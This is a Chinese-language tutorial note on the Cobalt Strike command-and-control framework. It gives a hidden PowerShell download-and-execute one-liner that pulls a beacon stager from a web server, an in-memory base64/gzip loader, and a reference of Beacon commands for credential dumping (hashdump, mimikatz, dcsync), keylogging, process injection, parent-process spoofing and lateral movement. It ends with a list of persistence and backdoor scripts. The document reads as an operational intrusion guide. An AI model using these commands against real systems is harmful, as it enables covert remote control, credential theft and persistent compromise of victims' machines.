# cobalt strike

上线
免杀
提权
## CobaltStrike4.0目录结构

```shell
.
├── agscript    //拓展应用的脚本
├── c2lint      //检查c2配置文件的语法和预览
├── cobaltstrike.auth
├── cobaltstrike.jar    主题程序
├── cobaltstrike.jar.cpgz
├── cobaltstrike.store
├── cobaltstrike_zh-hans.jar
├── cobaltstrike_zh-hant.jar
├── data
│   ├── archives.bin
│   ├── c2info.bin
│   ├── listeners.bin
│   ├── sessions.bin
│   └── targets.bin
├── icon.ico
├── libicmp64.so
├── libicmp.so
├── libtapmanager64.so
├── libtapmanager.so
├── peclone     //解析dll
├── start.bat   //window客户端启动脚本
├── start.sh    //linux客户端启动shell脚本
├── teamserver  //Linux服务端启动shell脚本
├── third-party //第三方工具
│   ├── erebus
│   │   ├── exp
│   │   │   ├── 8120
│   │   │   ├── com
│   │   │   └── jp
│   │   │       └── jp.vmp.exe
│   │   ├── gather
│   │   │   ├── chrome80.exe
│   │   │   └── cookies.exe
│   │   ├── LICENSE
│   │   ├── Main.cna
│   │   ├── modules
│   │   │   ├── auxiliary.cna
│   │   │   ├── commands.cna
│   │   │   ├── funs.cna
│   │   │   ├── gather.cna
│   │   │   ├── helper.cna
│   │   │   ├── lpe.cna
│   │   │   ├── persistence.cna
│   │   │   ├── post.cna
│   │   │   ├── pwn.cna
│   │   │   └── third.cna
│   │   ├── post
│   │   │   └── SharpShell.exe
│   │   ├── README.md
│   │   ├── script
│   │   │   ├── Invoke-EternalBlue.ps1
│   │   │   └── MS16-032.ps1
│   │   ├── server
│   │   │   └── Erebus-email.cna
│   │   ├── third
│   │   │   ├── EventLogMaster
│   │   │   │   ├── eventlog.cna
│   │   │   │   └── Func.ps1
│   │   │   └── rdpthief
│   │   │       └── RdpThief.cna
│   │   └── ver.txt
│   ├── Erebus-master.zip
│   ├── README.winvnc.txt
│   ├── winvnc.x64.dll
│   └── winvnc.x86.dll
├── 简体中文版.bat
└── 繁体中文版.bat
```


## Listener和http beacon:

创建http_beacon将stage放到web服务的/a路径下.

利用powershell,bitsadmin,regsvr32等命令行执行脚本,来执行后门

```shell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://xxx/a'))"
```
各个参数:
- powershell -command/-c 将字符串单做命令执行 一定要使用`双引号"`
- Invoke-Expression（IEX的别名）：用来把字符串当作命令执行
- WindowStyle Hidden（-w Hidden）：隐藏窗口
- NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件

从cobaltstrike下载http_beacon:

```powershell
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("xxx"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

将下载stage放到内存中不落地执行后会建立和cc服务端的tcp连接:

![path](https://nanazeven.github.io/image/2021-11-07-14-38-11.png)


## Beacon控制台

Beacon的通信机制是异步的,输入的命令不会立即执行而是会被加入到队列中,当Beacon回连时在将队列中的指令逐个执行,可以clear清除当前队列的指令

默认情况下Beacon每隔60秒回连一次,使用sleep命令更改.

```shell
argue [command] [fake arguments] //进程参数欺骗 命令 假参数 欺骗某个命令参数
```

```shell
blockdlls [start|stop] //阻止子进程加载非微软签名的dll 此特性为windows10独有
```

```shell
checkin 强制回连时发送主机信息
getprivs 启用当前访问令牌所拥有的特权
getsystem 尝试模拟一个SYSTEM账号的令牌获取System权限
getuid 获取当前令牌关联的用户ID
hashdump 转储密码哈希
downloads 列出正在下载的文件
jobs 查看后渗透任务列表 
logonpasswords 执行mimikatz获取密码
ls 显示目标机当前目录
screenshot 截屏
setenv 设置环境变量
unlink 断开与子Beacon的连接
upload 上传文件
```

```shell
dcsync 从域控中提取密码哈希
dcsync [DOMAIN.FQDN] 提取所有帐户的密码哈希
dcsync [DOMAIN.FQDN] [DOMAIN\user] 特定用户的
```

```
desktop VNC远程桌面
```

```
dllinject pid dllpath //反射dll进程注入
```

```
download file_path //下载目标机文件
```

```
elevate [exploit] [listener] //提权并生成一个高权限会话
runasadmin [exploit] [command] [args] //提权并执行命令
```

```
execute [program] [arguments] //执行程序（无回显）
```

```
execute-assembly .netpath [arguments] //内存加载.net程序执行
```

```
shell [command] //在cmd执行指令
```

```
inline-execute [/path/to/file.o] [args] 
```

```
inject [pid] <x86|x64> [listener] //指定一个进程pid派生新的session
```

```
keylogger [pid] [x86|x64] //将键盘记录器注入到指定进程 无参数则随机pid注入
```

```
jump [exploit] [target] [listener] //target上执行exp返回一个到listener的回话
remote-exec [method] [target] [command]//在target上执行command
run [program] [arguments] //在目标主机上执行进程
```

```
ppid [pid] //父进程欺骗 将指定进程作为父进程
ppid 直接执行ppid取消父进程欺骗
runu [pid] [command] [arguments] //也是父进程欺骗 
```

```
psinject [pid] [arch] [commandLet] [arguments] //在指定进程中执行powershell命令
```

```
reg query [x86|x64] [root\path] //注册表查询
```

```
spawn [x86|x64] [listener] //派生会话 Beacon默认使用rundll32.exe派生 
spawnto x64 C:\Windows\System32\notepad.exe //改用notepad.exe派生
```

```
ssh [target:port] [user] [pass] //beacon内置了ssh客户端
```

## 脚本管理Script Manager

Cobalt Strike下的Script Manager下,可以加载脚本用于拓展

- elevate.cna 拓展提权
- CVE-2018-4878.cna
- ArtifactPayloadGenerator.cna
- AVQuery.cna 查询安装的杀软
- CertUtilWebDelivery.cna 利用CertUtil和rundll32生成会话
- RedTeamRepo.cna  常用渗透命令
- ProcessColor.cna 显示带有颜色的进程列表
- SMBPayloadGenerator.cna  生成基于SMB的payload
- A11 In One.cna	就是all in one， 不过还没写好
- AVQuery.cna	列出安装的杀毒。对国外的支持好一点
- ArtifactPayloadGenerator.cna	创建多种类型payLoad项部菜单
- CertutilwebDelivery.cna	使用Certutil.exe无文件传送或spawn
- EDR.cna	检测有无终端安全产品
- logvis.cna	Beacon命令日志可视化
- ProcessColor.cna	进程上色
- ProcessMonitor.cna	检测指定时间间隔内的程序启动情况 Start 1m
- RedTeamRepo.cna	真 • 命令提示符。红队命令集。
- SMBPayloadGenerator.cna	生成基于SMBListener的payload
- Logging/logger.cna	导出1og到htmL
- Persistence/Persistence_Menu.cna	所有持久控制脚本的一个集合，似乎漏了Bitsadmin
- UserSchtasksPersist.cna	利用创建用户计划任务实现持久控制（用的schtasks）
- ServiceEXEPersist.cna	利用创建admin级别的自定义服务实现控制（用的SC)
- RegistryPersist.cna	利用写自定义注册表项的方式实现持久控制
- HKCURunKeyPSRegistryPersist.cna	利用在HKCU的run键写一个PSH的b64载荷实现持久控制
- HKLMRunKeyPSRegistryPersist.cna	利用在HKLN的run键写一个PSH的b64载荷实现持久控制
- WMIEventPersist.cna	利用PSH创建一个system级别的WMI Event实现控制
- WMICEventPersist.cna	利用WMIC创建一个system级别的WMI Event实现控制
- StartupGPOPersist.cna	利用在组策略的GPO中新建条目进而调用PSH脚本实现控制
- Stickykeys(OSK)BackDoor	利用替换粘滞键来创建后门实现持久控制（Menu里带的）
- StartUpFolderPersist.cna	利用Windows的启动文件夹实现持久控制
- Bitsadmin.cna	利用当前用户创建一个Bitsadmin任务来蹲管理员登陆实现控制